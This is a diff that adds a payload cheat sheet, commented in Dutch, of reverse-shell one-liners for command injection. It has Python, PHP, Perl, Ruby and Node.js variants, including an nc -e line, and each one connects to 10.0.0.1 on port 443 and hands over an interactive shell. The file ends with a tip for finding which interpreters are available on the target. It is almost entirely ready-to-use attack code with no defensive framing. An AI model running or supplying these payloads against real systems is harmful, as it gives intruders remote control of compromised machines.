@@ -1,0 +1,17 @@
+# Command Injection - Multi-Language Reverse Shells
+# === Python ===
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn("/bin/bash")'
+python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("10.0.0.1",443));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("/bin/bash")'
+# === PHP ===
+php -r '$sock=fsockopen("10.0.0.1",443);exec("/bin/sh -i <&3 >&3 2>&3");'
+php -r '$sock=fsockopen("10.0.0.1",443);$proc=proc_open("/bin/sh -i",array(0=>$sock,1=>$sock,2=>$sock),$pipes);'
+# PHP functies: system(), passthru(), shell_exec(), popen(), proc_open(), exec()
+# === Perl ===
+perl -e 'use Socket;$i="10.0.0.1";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
+# === Ruby ===
+ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",443).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
+# === Node.js ===
+require('child_process').exec('nc -nv 10.0.0.1 443 -e /bin/bash')
+# Node.js reverse shell (als nc niet beschikbaar):
+node -e '(function(){var net=require("net"),cp=require("child_process"),sh=cp.spawn("/bin/sh",[]);var client=new net.Socket();client.connect(443,"10.0.0.1",function(){client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);});})()'
+# Tip: Check beschikbare interpreters met 'which python3 perl ruby node'
